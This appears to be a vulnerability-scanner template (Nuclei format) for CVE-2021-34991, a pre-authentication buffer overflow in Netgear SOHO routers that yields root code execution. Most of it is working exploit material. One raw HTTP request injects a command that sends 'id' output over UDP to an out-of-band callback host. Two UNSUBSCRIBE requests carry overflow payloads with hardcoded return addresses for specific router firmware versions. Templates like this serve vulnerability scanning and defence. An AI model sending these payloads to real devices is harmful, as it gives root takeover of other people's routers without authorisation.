id: CVE-2021-34991

info:
  name: Netgear SOHO Pre-Auth BoF to RCE
  author: dwisiswant0
  severity: high
  description: |
    Netgear SOHO Devices contain a vulnerability that allows
    an attacker within the device’s Local Area Network (LAN)
    to obtain Remote Code Execution (RCE) as root on the device.
  reference:
    - https://github.com/grimm-co/NotQuite0DayFriday/tree/trunk/2021.11.16-netgear-upnp
    - https://kb.netgear.com/000064361/Security-Advisory-for-Pre-Authentication-Buffer-Overflow-on-Multiple-Products-PSV-2021-0168
    - https://nvd.nist.gov/vuln/detail/CVE-2021-34991
  tags: cve,cve2021,netgear,overflow,rce

requests:
  - raw:
      - |
        POST /Public_UPNP_C5 HTTP/1.1
        Host: {{Hostname}}
        SOAPAction
        Content-Length: 170

        <?xml version="1.0"?> <SOAP-ENV:Envelope> Body>:id >& /dev/udp/{{interactsh-url}}/90001;Body > </SOAP-ENV:Body> </SOAP-ENV:Envelope>
        {{wait_for(5)}}

      # For router XR300 (1.0.3.56)
      - |
        UNSUBSCRIBE /Public_UPNP_Event_1 HTTP/1.1
        Host: {{Hostname}}
        SID: §SID§
        UUID: §UUID§

        {{to_upper(rand_base(1093, "J"))}}H\xb7\x05\x00KKKKKKKKKKKK\xe0\xe7\x02\x00

      # For router R6700V3 (1.0.4.118)
      - |
        UNSUBSCRIBE /Public_UPNP_Event_1 HTTP/1.1
        Host: {{Hostname}}
        SID: §SID§
        UUID: §UUID§

        {{to_upper(rand_base(1105, "J"))}}\xd0j\x06\x00KKKKKKKKKKKKP\x81\x01\x00

    attack: clusterbomb
    payloads:
      SID:
        - "{{md5(rand_text_numeric(32))}}"
      UUID:
        - "{{to_upper(rand_base(67, 'A'))}}BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII\\xa84\\x01"

    cookie-reuse: true
    matchers:
      - type: word
        part: interactsh_protocol  # Confirms the DNS Interaction
        words:
          - "dns"
